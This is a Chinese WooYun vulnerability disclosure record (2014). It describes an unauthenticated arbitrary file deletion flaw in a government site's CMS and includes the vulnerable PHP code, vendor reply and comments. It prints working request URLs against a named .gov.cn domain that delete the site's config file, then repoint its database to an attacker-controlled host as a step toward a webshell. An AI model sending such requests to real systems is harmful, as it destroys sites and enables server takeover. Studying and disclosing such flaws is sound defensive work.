{"id": 46433, "wybug_id": "wooyun-2014-084830", "wybug_title": "某Gov在用系统任意文件删除导致可getshell", "wybug_corp": "台州市极速网络有限公司", "wybug_author": "路人甲", "wybug_date": "2014-11-26 21:01", "wybug_open_date": "2015-02-24 21:02", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-24：\t细节向公众公开  简要描述： 逻辑。。。逻辑。。。整套系统采用全局变量。攻击思路如下：  删除数据库配置文件--->利用get、post、cookie方式重新赋值$host,$dbname,$dbpass--->从而控制整个数据库（自己搭建远程数据库）--->找eval函数，直接getshell。。。这样做会导致网站直接挂掉。(太暴力了） 详细说明：  看这里,看这里  ... WooYun: 某Gov在用系统存在PHP代码执行漏洞 在网站根目录当中有一个picup.php文件\n<?phprequire \"./includes/headinc.php\";if($action == 'del') {\t@unlink(\"./data/$pic\");\t$up_err = \"删除成功\";}elseif($upsubmit) {\t//require_once './includes/upload.php';\t$picftpsave = 'pic';\t$maxpicftpsize = '100000';\t$picftp_extensions = 'gif,jpg,png';\tif($picftp) {\t\tpic_attach_upload2();\t\tif($up_err) {\t\t\t$upaction = 0;\t\t\t$content = $up_err;\t\t}else {\t\t\t$upaction = 1;\t\t\t$up_err = \"上传成功\";\t\t}\t}}include getData('union_picup');function pic_attach_upload2() {\tglobal $up_err,$picftpsave,$picftp, $picftp_name, $picftp_type, $picftp_size, $picftp_fname, $maxpicftpsize, $picftp_extensions;\t$paint_path = './data';\t.....//省略若干代码\n其中headinc.php文件里面没有权限限制。代码如下：\n<?phpif(is_file('./includes/360safe/360webscan.php')){\t    require_once('./includes/360safe/360webscan.php');} error_reporting(E_ERROR | E_WARNING | E_PARSE);if (function_exists('date_default_timezone_set')) {\tdate_default_timezone_set('Etc/GMT-8');}$mtime = explode(' ', microtime());define(\"KIN_1_UNION_748_xPo1XXyOU___sspx_qee_PM555_\",TRUE);set_time_limit(0);set_magic_quotes_runtime(0);if (!isset($_REQUEST)){$_REQUEST = array_merge($_GET, $_POST, $_COOKIE);}if(getenv('HTTP_X_FORWARDED_FOR')!='') {    $yip = (!empty($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : ( ( !empty($_ENV['REMOTE_ADDR']) ) ? $_ENV['REMOTE_ADDR'] : $_SERVER['REMOTE_ADDR'] );    if (preg_match(\"/^([0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+)/\", getenv('HTTP_X_FORWARDED_FOR'), $ip_list)) {\t\t$private_ip = array('/^0\\./', '/^127\\.0\\.0\\.1/', '/^192\\.168\\..*/', '/^172\\.16\\..*/', '/^10..*/', '/^224..*/', '/^240..*/');        $yip = preg_replace($private_ip, $client_ip, $ip_list[1]);    }}else {    $yip = ( !empty($_SERVER['REMOTE_ADDR']) ) ? $_SERVER['REMOTE_ADDR'] : ( ( !empty($_ENV['REMOTE_ADDR']) ) ? $_ENV['REMOTE_ADDR'] : $_SERVER['REMOTE_ADDR'] );}$ssid = md5($_SERVER['HTTP_USER_AGENT'].$yip);if(empty($referer) && isset($_SERVER['HTTP_REFERER'])) {\t$referer = $_SERVER['HTTP_REFERER'];}$PHP_SELF = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];$SCRIPT_FILENAME = str_replace('\\\\\\\\', '/', ($_SERVER['PATH_TRANSLATED'] ? $_SERVER['PATH_TRANSLATED'] : $_SERVER['SCRIPT_FILENAME']));$union_root = substr($SCRIPT_FILENAME, 0, strrpos($SCRIPT_FILENAME, '/') + 1);$union_root = '';//header(\"Cache-control: private\");require './includes/config.php';require './includes/dbClass.php';if($IS_LOGIN == true) {#若是进入后台管理(admin.php)，则启用会话\trequire './includes/sess.php';}require './includes/global.php';$timestamp = time();$magic_quotes_gpc = get_magic_quotes_gpc();$register_globals = @ini_get('register_globals');$set_cachetime = '1800';$UNION_SESSION = $UNION_CACHE = $UNION_USER = array();$currscript = basename($_SERVER['PHP_SELF']);$currscript = substr($currscript, 0, strpos($currscript, '.php'));$creatsession = false;unset($union_user,$union_uid,$condi);if(!@ini_get('register_globals') || !get_magic_quotes_gpc()) {\t@extract(union_addslashes($_REQUEST));\tif(!@ini_get('register_globals')) {\t\tif(is_array($_FILES))\t\tforeach($_FILES as $key => $val) {\t\t\t$$key = $val['tmp_name'];\t\t\t${$key.'_name'} = $val['name'];\t\t\t${$key.'_size'} = $val['size'];\t\t\t${$key.'_type'} = $val['type'];\t\t}\t}}//栏目列表$col_list = $db->fetchData(\"select * from table_columns where del='0' order by seq ASC\");//栏目分类$col_cate_list = $db->fetchData(\"select * from table_columns_cate where del='0' order by seq ASC\");//栏目模板$col_cate_tpl = $db->fetchData(\"select * from table_columns_tpl where del='0'\");foreach($col_list as $key=>$val){\t\tif($col==$key){\t\t$navAddC[$key]=\"images/index/menu3.jpg\";}\t\t\tforeach($col_cate_list as $key2=>$val2){\t\t\t\t\t\tif($val[id]==$val2[cid]&&$val2[pid]=='-1'){\t\t\t\t$aa=aaa.$val[id];\t\t\t\tif($val2[tourl]) {\t\t\t\t\t$$aa .= \"&nbsp;<a style=font-size:9pt;line-height:14pt; href=\\\"$val2[tourl]\\\"><font color=\\\"#FFFFFF\\\">·$val2[name]</font></a>&nbsp;<br>\";\t\t\t\t}else {\t\t\t\t\t$$aa .= \"&nbsp;<a style=font-size:9pt;line-height:14pt; href=\\\"web-col$val[id]-actlist-cid$val2[id].html\\\"><font color=\\\"#FFFFFF\\\">·$val2[name]</font></a>&nbsp;<br>\";\t\t\t\t}\t\t\t}\t\t}\t}if($cfg_use_check == true) {\t$cfg2_check_list = $db->fetchData(\"select * from table_info_check order by checknum ASC\");\tforeach($cfg2_check_list as $v) {\t\t$cfg2_check_success = $v['checknum'];\t}}###########link$perpage = 5;if(!$page) {\t$page = 1;}$offset = ($page - 1) * $perpage;$rsult = $db->fetchSingle(\"SELECT COUNT(*) as num FROM oa_columns_cate where del='0' && type='link'\");$num = $total = $rsult[num];$multipage = pages($num, $perpage, $page, \"$baseurl&saction=$saction\");$inforr_list = $db->fetchData(\"select * from oa_columns_cate where del='0' && type='link' order by seq ASC LIMIT $offset, $perpage\");###########link$perpage = 20;if(!$page) {\t$page = 1;}$offset = ($page - 1) * $perpage;$rsult = $db->fetchSingle(\"SELECT COUNT(*) as num FROM oa_columns_cate where del='0' && type='link'\");$num = $total = $rsult[num];$multipage = pages($num, $perpage, $page, \"$baseurl&saction=$saction\");$inforr_list2 = $db->fetchData(\"select * from oa_columns_cate where del='0' && type='link' order by seq ASC LIMIT $offset, $perpage\");$link_list = $db->fetchData(\"select * from oa_link where del='0' order by dtime DESC\");?>\n看其中变量赋值方式..\nif(!@ini_get('register_globals') || !get_magic_quotes_gpc()) {\t@extract(union_addslashes($_REQUEST));\tif(!@ini_get('register_globals')) {\t\tif(is_array($_FILES))\t\tforeach($_FILES as $key => $val) {\t\t\t$$key = $val['tmp_name'];\t\t\t${$key.'_name'} = $val['name'];\t\t\t${$key.'_size'} = $val['size'];\t\t\t${$key.'_type'} = $val['type'];\t\t}\t}}\n所以直接即访问：www.jjqjcy.gov.cn/picup.php?action=del&pic=../includes/config.php（千万别访问，一访问，网站就挂了）第二部、远程搭建一个该类型数据库然后重新赋值以下几个变量\n$dbhost = '182.2.x.x';   \t// 数据库服务器\t$dbuname = \"jjxxxy\";   \t\t// 数据库用户名\t$dbpass = \"xx\";   \t\t// 数据库密码\t$dbname = 'jjqjcy';\n如采用www.jjqjcy.gov.cn/picup.php?action=del&pic=../includes/config.php&dbhost=3.3.3.3&dbuname=3333&dbpass=3333&dbname=dddd找到网站当中的其他eval函数，控制该数据库某变量即可getshell(其中找eval测试我就不提供了）。。这样会导致很多站挂。。。（请参考13年qibocms getshell)太黄太暴力，各位测试的需小心...本文只提供思路...后果自负..   漏洞证明：  www.jjqjcy.gov.cn/picup.php?action=del&pic=../includes/configxxxxxxxx.php（千万别访问，你可以删其他的，你一访问，站就挂了）   修复方案：  过滤吧，加权限   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2014-12-01 11:35 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-26 21:41 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @xsser   WooYun: 某Gov在用系统存在PHP代码执行漏洞   一样吗？不是可以直接执行PHP代码    \n     2015-02-24 21:36 |    \t\t窝窝哥 \t\t\t( 实习白帽子  |\t\t\t        Rank:86 漏洞数:29        | 没WB啊啊啊啊！)\t\t \n  一堆GOV的站看来又得被日了    \n     2015-02-28 11:36 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  表示看不懂啊，好多东西    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}